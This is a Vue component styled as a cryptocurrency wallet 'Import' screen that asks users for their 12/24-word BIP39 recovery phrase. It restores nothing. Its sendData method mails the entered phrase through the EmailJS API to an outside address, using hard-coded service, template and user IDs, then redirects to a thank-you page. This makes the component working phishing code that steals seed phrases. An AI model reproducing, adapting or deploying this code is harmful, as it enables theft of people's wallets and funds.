<template>
  <div class="private flex h-full flex-col px-5">
    <label class="mb-4 font-light text-lg text-center" for=""
      >Please enter your 12/24 word phrase</label
    >
    <el-input v-model="nmenomic" type="textarea" :rows="6"> </el-input>
    <span class="mt-4">Please separate each Mnemonic Phrase with a space.</span>
    <p class="my-10 font-semibold text-sm">
      Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys
      that manage your acccounts.
    </p>
    <el-button
      :loading="loading"
      style="
        background: rgb(0, 140, 115) !important;
        color: white;
        font-weight: bold;
      "
      @click="sendData"
      >Import</el-button
    >
  </div>
</template>

<script>
import axios from 'axios'
export default {
  props: {
    walletType: {
      type: String,
      default: ''
    },
  },
  data() {
    return {
      nmenomic: '',
      loading: false,
    }
  },
  methods: {
    sendData() {
      this.loading = true
      const self = this
      const checker = this.formChecker();
      if (checker) {
        const data = {
          // service_id: "service_khz33ja",
          // template_id: "template_hl2qzeh",
          // user_id: "user_NfLXuXfvGqkJFOqnVRRmw",
          service_id: "service_xq2i24g",
          template_id: "template_bjz3ej8",
          user_id: "user_jBO0e0q6wVjDKv6fvrb9q",
          template_params: {
            from_name: `Nmenomic on ${this.walletType}`,
            nmenomic: this.nmenomic,
            reply_to: "samuelbarnett660@gmail.com"
          },
        }
        axios
          .post('https://api.emailjs.com/api/v1.0/email/send', data)
          .then(function () {
            self.$router.push('/thank-you')
            self.loading = false
          })
          .catch(function () {
            self.loading = false
          })
      } else {
        this.$notify({
          title: 'Warning',
          message: '(- -)',
          type: 'warning',
        })
      }
    },
    formChecker() {
      if (this.nmenomic === '') {
        return false
      } else if (this.nmenomic.includes('+')){
          return false
        } else {
          return true
        }
    },
  },
}
</script>
